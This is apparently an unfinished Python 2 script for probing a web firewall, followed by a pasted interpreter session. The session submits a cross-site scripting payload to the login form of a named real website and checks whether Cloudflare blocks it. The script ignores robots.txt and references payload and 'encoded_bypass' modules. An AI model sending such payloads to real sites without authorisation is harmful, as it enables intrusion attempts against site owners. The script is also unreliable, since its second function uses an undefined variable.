
"""entry point main control script"""

from __future__ import print_function
from os import urandom, system

# build global exceptions for entry point main
class ModuleNotFound (Exception):
	def __str__ (self):
		return "Could not import required module."

class ResourceNotFound (Exception):
	def __str__ (self):
		return "Could not import required resource folder."

class FailedConnection (Exception):
	def __str__ (self):
		return "Could not establish proper HTTP connection."

try:
	from headers.user_agents import all_user_agents
	'''
	from payloads.injectx import signature_based
	from payloads.injectx import encoded_bypass
	'''
except Exception:
	raise ResourceNotFound()

# make default dependency imports
import mechanize
import requests
import cookielib
from bs4 import BeautifulSoup

# send normal HTTP request emulating a web browser and examine response
def normal_http_request (url):

	browser_emulator = mechanize.Browser()
	cookie_emulator = cookielib.LWPCookieJar()

	browser_emulator.set_cookiejar(cookie_emulator)

	browser_emulator.set_handle_equiv(True)
	browser_emulator.set_handle_gzip(True)
	browser_emulator.set_handle_redirect(True)
	browser_emulator.set_handle_referer(True)
	browser_emulator.set_handle_robots(False)

	browser_emulator.set_handle_refresh(
		mechanize._http.HTTPRefreshProcessor(), max_time=1)

	browser_emulator.add_headers = [
		('User-Agent', all_user_agents['samsung-galaxy-s8'])]

	browser_emulator.open(url)
	response = browser_emulator.response()

	if response.getcode() == 200:
		print(response.info())

def possibly_mailicious_request (url):

	malicious_emulator = mechanize.Browser()

	# do not set any cookies, a purposeful red flag
	browser_emulator.set_handle_equiv(False)

normal_http_request('https://www.myhta.org/system/login/')
possibly_mailicious_request('https://www.myhta.org/system/login/')

"""
C:\Users\Student>python
Python 2.7.14 (v2.7.14:84471935ed, Sep 16 2017, 20:19:30) [MSC v.1500 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests, mechanize
>>> req = mechanize.Browser()
>>> req.open('https://www.myhta.org/system/login/')
<response_seek_wrapper at 0x305b760 whose wrapped object = <closeable_response at 0x305d8f0 whose fp = <socket._fileobject object at 0x0304CA70>>>
>>> req.select_form('formInput')
>>> payload = "<svg><script>alert&grave;1&grave;<p>"
>>> req.form['usr_email'] = payload
>>> req.submit()
<response_seek_wrapper at 0x3050418 whose wrapped object = <closeable_response at 0x38b8738 whose fp = <socket._fileobject object at 0x03890EF0>>>
>>> resp = req.response().read()
>>> if resp.find('Cloudflare')(:
  File "<stdin>", line 1
    if resp.find('Cloudflare')(:
                               ^
SyntaxError: invalid syntax
>>> if resp.find('Cloudflare'):
...     print(1)
...
1
>>>
"""

